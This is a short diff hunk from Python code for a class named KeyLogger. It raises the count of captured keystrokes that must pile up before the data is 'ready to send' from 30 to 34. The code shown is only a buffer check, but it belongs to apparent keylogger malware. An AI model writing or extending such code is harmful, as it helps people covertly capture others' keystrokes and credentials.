@@ -61,7 +61,7 @@ class KeyLogger():
 
     def is_ready_to_send(self):
         while True:
-            if len(self.keys['data'])>30 and self.keys['data'][-1]['event']=='Up':
+            if len(self.keys['data'])>34 and self.keys['data'][-1]['event']=='Up':
                 return
 
     def keys_capture(self):
